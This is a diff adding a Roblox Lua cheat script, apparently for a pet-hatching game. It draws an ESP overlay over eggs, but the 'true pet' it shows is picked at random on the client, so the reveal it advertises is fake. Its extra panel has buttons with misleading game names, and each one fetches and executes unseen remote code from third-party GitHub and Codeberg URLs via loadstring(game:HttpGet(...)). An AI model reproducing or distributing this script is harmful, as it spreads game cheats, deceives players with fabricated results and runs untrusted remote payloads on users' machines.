@@ -1,0 +1,359 @@
+‎-- Pet Randomizer with Gray/Transparent UI, ESP, Auto Random, Dragging
+‎
+‎local Players = game:GetService("Players")
+‎local Workspace = game:GetService("Workspace")
+‎local TweenService = game:GetService("TweenService")
+‎local UserInputService = game:GetService("UserInputService")
+‎local RunService = game:GetService("RunService")
+‎local player = Players.LocalPlayer
+‎local mouse = player:GetMouse()
+‎local petTable = {
+‎    ["Common Egg"] = { "Dog", "Bunny", "Golden Lab" },
+‎    ["Uncommon Egg"] = { "Chicken", "Black Bunny", "Cat", "Deer" },
+‎    ["Rare Egg"] = { "Pig", "Monkey", "Rooster", "Orange Tabby", "Spotted Deer" },
+‎    ["Legendary Egg"] = { "Cow", "Polar Bear", "Sea Otter", "Turtle", "Silver Monkey" },
+‎    ["Mythical Egg"] = { "Grey Mouse", "Brown Mouse", "Squirrel", "Red Giant Ant" },
+‎    ["Bug Egg"] = { "Snail", "Caterpillar", "Giant Ant", "Praying Mantis" },
+‎    ["Night Egg"] = { "Frog", "Hedgehog", "Mole", "Echo Frog", "Night Owl", },
+‎    ["Bee Egg"] = { "Bee", "Honey Bee", "Bear Bee", "Petal Bee" },
+‎    ["Anti Bee Egg"] = { "Wasp", "Moth", "Tarantula Hawk" },
+‎    ["Oasis Egg"] = { "Meerkat", "Sand Snake", "Axolotl" },
+‎    ["Paradise Egg"] = { "Ostrich", "Peacock", "Capybara" },
+‎    ["Dinosaur Egg"] = { "Raptor", "Triceratops", "Stegosaurus" },
+‎    ["Primal Egg"] = { "Parasaurolophus", "Iguanodon", "Pachycephalosaurus" },
+‎    ["Zen Egg"] = { "Tanchozuru", "Kappa", "Kitsune", "Tanuki", "NihonZaru" },
+‎}
+‎
+‎local espEnabled = true
+‎local truePetMap = {}
+‎local autoRunning = false
+‎local bestPets = {
+‎    ["Raccoon"] = true, ["Dragonfly"] = true, ["Queen Bee"] = true,
+‎    ["Disco Bee"] = true, ["Fennec Fox"] = true, ["Fox"] = true,
+‎    ["Mimic Octopus"] = true
+‎}
+‎
+‎-- GUI Setup
+‎local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+‎screenGui.Name = "PetRandomizerUI"
+‎
+‎local mainFrame = Instance.new("Frame")
+‎mainFrame.Size = UDim2.new(0, 250, 0, 220)
+‎mainFrame.Position = UDim2.new(0.5, -125, 0.5, -90)
+‎mainFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+‎mainFrame.BackgroundTransparency = 0.3
+‎mainFrame.BorderSizePixel = 0
+‎mainFrame.Parent = screenGui
+‎mainFrame.Active = true
+‎mainFrame.Draggable = true
+‎
+‎Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)
+‎local stroke = Instance.new("UIStroke", mainFrame)
+‎stroke.Color = Color3.fromRGB(150, 150, 150)
+‎stroke.Thickness = 2
+‎
+‎-- Title
+‎local title = Instance.new("TextLabel", mainFrame)
+‎title.Size = UDim2.new(1, 0, 0, 30)
+‎title.Position = UDim2.new(0, 0, 0, 0)
+‎title.BackgroundTransparency = 1
+‎title.Text = "X-3 Minutes"
+‎title.TextColor3 = Color3.fromRGB(200, 200, 200)
+‎title.TextStrokeTransparency = 0.6
+‎title.Font = Enum.Font.GothamBold
+‎title.TextSize = 18
+‎
+‎-- Credit
+‎local credit = Instance.new("TextLabel", mainFrame)
+‎credit.Size = UDim2.new(1, 0, 0, 15)
+‎credit.Position = UDim2.new(0, 0, 0, 25)
+‎credit.BackgroundTransparency = 1
+‎credit.Text = "Made by: xxzii"
+‎credit.TextColor3 = Color3.fromRGB(170, 170, 170)
+‎credit.Font = Enum.Font.Gotham
+‎credit.TextSize = 12
+‎
+‎-- Create Button Utility
+‎local function createButton(text, positionY, color)
+‎    local button = Instance.new("TextButton")
+‎    button.Size = UDim2.new(0.9, 0, 0, 35)
+‎    button.Position = UDim2.new(0.05, 0, 0, positionY)
+‎    button.BackgroundColor3 = color or Color3.fromRGB(70, 70, 70)
+‎    button.BackgroundTransparency = 0.3
+‎    button.Text = text
+‎    button.Font = Enum.Font.GothamBold
+‎    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+‎    button.TextSize = 16
+‎    button.Parent = mainFrame
+‎    Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
+‎    return button
+‎end
+‎
+‎-- Pet ESP
+‎local function glitchLabelEffect(label)
+‎    coroutine.wrap(function()
+‎        local original = label.TextColor3
+‎        for i = 1, 2 do
+‎            label.TextColor3 = Color3.new(1, 0, 0)
+‎            wait(0.07)
+‎            label.TextColor3 = original
+‎            wait(0.07)
+‎        end
+‎    end)()
+‎end
+‎
+‎local function applyEggESP(eggModel, petName)
+‎    local existingLabel = eggModel:FindFirstChild("PetBillboard", true)
+‎    if existingLabel then existingLabel:Destroy() end
+‎    local existingHighlight = eggModel:FindFirstChild("ESPHighlight")
+‎    if existingHighlight then existingHighlight:Destroy() end
+‎    if not espEnabled then return end
+‎
+‎    local basePart = eggModel:FindFirstChildWhichIsA("BasePart")
+‎    if not basePart then return end
+‎
+‎    local hatchReady = true
+‎    local hatchTime = eggModel:FindFirstChild("HatchTime")
+‎    local readyFlag = eggModel:FindFirstChild("ReadyToHatch")
+‎
+‎    if hatchTime and hatchTime:IsA("NumberValue") and hatchTime.Value > 0 then
+‎        hatchReady = false
+‎    elseif readyFlag and readyFlag:IsA("BoolValue") and not readyFlag.Value then
+‎        hatchReady = false
+‎    end
+‎
+‎    local billboard = Instance.new("BillboardGui")
+‎    billboard.Name = "PetBillboard"
+‎    billboard.Size = UDim2.new(0, 270, 0, 50)
+‎    billboard.StudsOffset = Vector3.new(0, 4.5, 0)
+‎    billboard.AlwaysOnTop = true
+‎    billboard.MaxDistance = 500
+‎    billboard.Parent = basePart
+‎
+‎    local label = Instance.new("TextLabel")
+‎    label.Size = UDim2.new(1, 0, 1, 0)
+‎    label.BackgroundTransparency = 1
+‎    label.Text = eggModel.Name .. " | " .. petName
+‎    if not hatchReady then
+‎        label.Text = eggModel.Name .. " | " .. petName .. " (Not Ready)"
+‎        label.TextColor3 = Color3.fromRGB(160, 160, 160)
+‎        label.TextStrokeTransparency = 0.5
+‎    else
+‎        label.TextColor3 = Color3.new(1, 1, 1)
+‎        label.TextStrokeTransparency = 0
+‎    end
+‎    label.TextScaled = true
+‎    label.Font = Enum.Font.FredokaOne
+‎    label.Parent = billboard
+‎
+‎    glitchLabelEffect(label)
+‎
+‎    local highlight = Instance.new("Highlight")
+‎    highlight.Name = "ESPHighlight"
+‎    highlight.FillColor = Color3.fromRGB(255, 200, 0)
+‎    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+‎    highlight.FillTransparency = 0.7
+‎    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+‎    highlight.Adornee = eggModel
+‎    highlight.Parent = eggModel
+‎end
+‎
+‎local function removeEggESP(eggModel)
+‎    local label = eggModel:FindFirstChild("PetBillboard", true)
+‎    if label then label:Destroy() end
+‎    local highlight = eggModel:FindFirstChild("ESPHighlight")
+‎    if highlight then highlight:Destroy() end
+‎end
+‎
+‎local function getPlayerGardenEggs(radius)
+‎    local eggs = {}
+‎    local char = player.Character or player.CharacterAdded:Wait()
+‎    local root = char:FindFirstChild("HumanoidRootPart")
+‎    if not root then return eggs end
+‎
+‎    for _, obj in pairs(Workspace:GetDescendants()) do
+‎        if obj:IsA("Model") and petTable[obj.Name] then
+‎            local dist = (obj:GetModelCFrame().Position - root.Position).Magnitude
+‎            if dist <= (radius or 60) then
+‎                if not truePetMap[obj] then
+‎                    local pets = petTable[obj.Name]
+‎                    local chosen = pets[math.random(1, #pets)]
+‎                    truePetMap[obj] = chosen
+‎                end
+‎                table.insert(eggs, obj)
+‎            end
+‎        end
+‎    end
+‎    return eggs
+‎end
+‎
+‎local function randomizeNearbyEggs()
+‎    local eggs = getPlayerGardenEggs(60)
+‎    for _, egg in ipairs(eggs) do
+‎        local pets = petTable[egg.Name]
+‎        local chosen = pets[math.random(1, #pets)]
+‎        truePetMap[egg] = chosen
+‎        applyEggESP(egg, chosen)
+‎    end
+‎    print("Randomized", #eggs, "eggs.")
+‎end
+‎
+‎local function flashEffect(button)
+‎    local originalColor = button.BackgroundColor3
+‎    for i = 1, 3 do
+‎        button.BackgroundColor3 = Color3.new(1, 1, 1)
+‎        wait(0.05)
+‎        button.BackgroundColor3 = originalColor
+‎        wait(0.05)
+‎    end
+‎end
+‎
+‎local function countdownAndRandomize(button)
+‎    for i = 10, 1, -1 do
+‎        button.Text = "🎲 Randomize in: " .. i
+‎        wait(1)
+‎    end
+‎    flashEffect(button)
+‎    randomizeNearbyEggs()
+‎    button.Text = "🎲 Randomize Pets"
+‎end
+‎
+‎-- UI Buttons
+‎local randomizeBtn = createButton("🎲 Randomize Pets", 50)
+‎local espBtn = createButton("👁️ ESP: ON", 90)
+‎local autoBtn = createButton("🔁 Auto Randomize: OFF", 130)
+‎
+‎-- Button Logic
+‎randomizeBtn.MouseButton1Click:Connect(function()
+‎    countdownAndRandomize(randomizeBtn)
+‎end)
+‎
+‎espBtn.MouseButton1Click:Connect(function()
+‎    espEnabled = not espEnabled
+‎    espBtn.Text = espEnabled and "👁️ ESP: ON" or "👁️ ESP: OFF"
+‎    for _, egg in pairs(getPlayerGardenEggs(60)) do
+‎        if espEnabled then
+‎            applyEggESP(egg, truePetMap[egg])
+‎        else
+‎            removeEggESP(egg)
+‎        end
+‎    end
+‎end)
+‎
+‎autoBtn.MouseButton1Click:Connect(function()
+‎    autoRunning = not autoRunning
+‎    autoBtn.Text = autoRunning and "🔁 Auto Randomize: ON" or "🔁 Auto Randomize: OFF"
+‎    coroutine.wrap(function()
+‎        while autoRunning do
+‎            countdownAndRandomize(randomizeBtn)
+‎            for _, petName in pairs(truePetMap) do
+‎                if bestPets[petName] then
+‎                    autoRunning = false
+‎                    autoBtn.Text = "🔁 Auto Randomize: OFF"
+‎                    return
+‎                end
+‎            end
+‎            wait(1)
+‎        end
+‎    end)()
+‎end)
+‎
+‎-- Initial ESP
+‎for _, egg in pairs(getPlayerGardenEggs(60)) do
+‎    applyEggESP(egg, truePetMap[egg])
+‎end
+‎
+‎-- Draggable Main Frame
+‎local dragging = false
+‎local dragInput, mousePos, framePos
+‎
+‎mainFrame.InputBegan:Connect(function(input)
+‎    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+‎        dragging = true
+‎        mousePos = input.Position
+‎        framePos = mainFrame.Position
+‎
+‎        input.Changed:Connect(function()
+‎            if input.UserInputState == Enum.UserInputState.End then
+‎                dragging = false
+‎            end
+‎        end)
+‎    end
+‎end)
+‎
+‎-- Extra Button
+‎local openExtraBtn = createButton("MM2-ADOPT ME SCRIPT", 170)
+‎
+‎-- Extra Panel
+‎local extraPanel = Instance.new("Frame")
+‎extraPanel.Name = "ExtraPanel"
+‎extraPanel.Size = UDim2.new(0, 250, 0, 270)
+‎extraPanel.Position = UDim2.new(0.5, -15, 0.5, -90)
+‎extraPanel.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+‎extraPanel.BackgroundTransparency = 0.3
+‎extraPanel.Active = true
+‎extraPanel.Draggable = true
+‎extraPanel.Visible = false
+‎extraPanel.Parent = screenGui
+‎
+‎Instance.new("UICorner", extraPanel).CornerRadius = UDim.new(0, 8)
+‎local extraStroke = Instance.new("UIStroke", extraPanel)
+‎extraStroke.Color = Color3.fromRGB(150, 150, 150)
+‎extraStroke.Thickness = 2
+‎
+‎local extraTitle = Instance.new("TextLabel")
+‎extraTitle.Size = UDim2.new(1, 0, 0, 30)
+‎extraTitle.Position = UDim2.new(0, 0, 0, 0)
+‎extraTitle.BackgroundTransparency = 1
+‎extraTitle.Text = "X-3 Minutes"
+‎extraTitle.TextColor3 = Color3.fromRGB(220, 220, 220)
+‎extraTitle.Font = Enum.Font.GothamBold
+‎extraTitle.TextSize = 18
+‎extraTitle.Parent = extraPanel
+‎
+‎-- Extra Button Utility
+‎local function createExtraButton(text, posY, callback)
+‎	local button = Instance.new("TextButton")
+‎	button.Size = UDim2.new(0.9, 0, 0, 35)
+‎	button.Position = UDim2.new(0.05, 0, 0, posY)
+‎	button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+‎	button.BackgroundTransparency = 0.3
+‎	button.Text = text
+‎	button.Font = Enum.Font.GothamBold
+‎	button.TextColor3 = Color3.fromRGB(255, 255, 255)
+‎	button.TextSize = 14
+‎	button.Parent = extraPanel
+‎
+‎	local corner = Instance.new("UICorner")
+‎	corner.CornerRadius = UDim.new(0, 6)
+‎	corner.Parent = button
+‎
+‎	local stroke = Instance.new("UIStroke", button)
+‎	stroke.Color = Color3.fromRGB(150, 150, 150)
+‎	stroke.Thickness = 2
+‎
+‎	button.MouseButton1Click:Connect(callback)
+‎end
+‎
+‎-- Extra Scripts
+‎createExtraButton("MM2", 40, function()
+‎	loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+‎end)
+‎
+‎createExtraButton("ADOPT ME", 90, function()
+‎	local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+‎	Spawner.Load()
+‎end)
+‎
+‎createExtraButton("SAB", 140, function()
+‎    loadstring(game:HttpGet("https://raw.githubusercontent.com/sscxzii/Open-Source-To-GitHub/refs/heads/main/Age%2050"))()
+‎end)
+‎
+‎createExtraButton("BLADEBALL", 190, function()
+‎    loadstring(game:HttpGet("https://raw.githubusercontent.com/sscxzii/Open-Source-To-GitHub/refs/heads/main/Pet%20Mutation"))()
+‎end)
+‎
+‎-- Toggle Extra Panel
+‎openExtraBtn.MouseButton1Click:Connect(function()
+‎	extraPanel.Visible = not extraPanel.Visible
+‎end)
